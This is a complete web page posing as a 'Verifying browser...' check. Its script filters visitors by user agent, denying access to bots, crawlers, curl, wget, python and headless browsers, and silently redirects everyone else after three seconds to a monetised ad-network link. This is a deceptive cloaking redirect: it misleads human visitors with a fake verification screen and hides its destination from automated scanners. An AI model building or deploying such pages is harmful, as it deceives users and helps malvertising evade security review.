<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Continue...</title>
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }

    .spinner {
      border: 6px solid #ccc;
      border-top: 6px solid #00f;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .msg {
      font-size: 20px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="msg">Verifying browser...</div>
  <div class="spinner"></div>

  <script>
    const botPatterns = [
      /bot/i,
      /crawl/i,
      /spider/i,
      /facebook/i,
      /python/i,
      /curl/i,
      /wget/i,
      /headless/i,
      /phantom/i
    ];

    const userAgent = navigator.userAgent || "";
    const isBot = botPatterns.some(pattern => pattern.test(userAgent));

    if (!isBot) {
      setTimeout(() => {
        window.location.href = "https://www.profitableratecpm.com/dvaw0sfsx?key=abe25b4c33c7c9d0c497c6415d52871b";
      }, 3000);
    } else {
      document.querySelector(".msg").innerText = "Access denied (bot detected).";
      document.querySelector(".spinner").style.display = "none";
    }
  </script>
</body>
</html>
